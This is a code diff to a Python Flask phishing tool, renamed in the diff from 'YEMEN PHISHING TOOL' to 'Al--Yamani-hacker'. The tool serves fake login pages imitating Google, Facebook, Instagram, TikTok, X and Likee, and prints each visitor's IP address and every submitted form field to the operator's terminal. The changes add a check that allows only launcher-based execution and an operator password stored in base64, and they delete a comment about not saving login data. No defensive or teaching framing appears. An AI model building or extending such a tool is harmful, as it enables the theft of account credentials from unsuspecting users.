@@ -2,10 +2,16 @@ import os
 import subprocess
 import threading
 import time
+import base64
+import sys
 from flask import Flask, request, render_template, redirect
-from datetime import datetime
 from termcolor import cprint
 import getpass
+
+# Execution protection: only allowed via Ansar_Allah.sh
+if os.getenv("ANSAR_LAUNCH") != "YES":
+    print("[X] Unauthorized execution. Use ./Ansar_Allah.sh.")
+    sys.exit(1)
 
 app = Flask(__name__)
 selected_template = None
@@ -26,8 +32,13 @@ def load_password_from_file():
         cprint(f"[X] Password file '{PASSWORD_FILE}' not found!", "red")
         return None
     with open(PASSWORD_FILE, "r") as f:
-        chars = [line.strip() for line in f.readlines()]
-    return "".join(chars)
+        encoded = f.read().strip()
+    try:
+        decoded = base64.b64decode(encoded).decode()
+        return decoded
+    except Exception as e:
+        cprint(f"[X] Error decoding password: {e}", "red")
+        return None
 
 def slow_print(text, color="white", delay=0.0667):
     for char in text:
@@ -42,10 +53,10 @@ def check_password():
     for _ in range(3):
         entered_pass = getpass.getpass("Enter password: ")
         if entered_pass == real_password:
-            cprint("[✔] Password correct!\n", "green")
+            cprint("[✔] Access granted.\n", "green")
             return True
         else:
-            cprint("[X] Incorrect password.\n", "red")
+            cprint("[X] Wrong password.\n", "red")
     return False
 
 @app.route("/", methods=["GET", "POST"])
@@ -58,7 +69,6 @@ def main_page():
         ip = request.remote_addr
         data = request.form.to_dict()
 
-        # Do not save login data, only print to terminal
         cprint(f"\n[+] New login attempt ({template_names[selected_template]})", "cyan")
         cprint(f"    IP: {ip}", "cyan")
         for k, v in data.items():
@@ -100,10 +110,9 @@ def select_template():
 def show_intro():
     os.system("clear")
     slow_print("===================================", "green")
-    slow_print("     YEMEN PHISHING TOOL", "green")
+    slow_print("         Al--Yamani-hacker", "green")
     slow_print("===================================\n", "green")
-    slow_print("[!] Created by the Yemeni hacker.", "yellow")
-    slow_print("[*] Supported Templates: Google, Facebook, Instagram, TikTok, X, Likee", "yellow")
+    slow_print("[*] Templates: Google, Facebook, Instagram, TikTok, X, Likee", "yellow")
     slow_print("[~] Initializing...", "blue")
     for _ in range(25):
         cprint("█", "white", end="", flush=True)
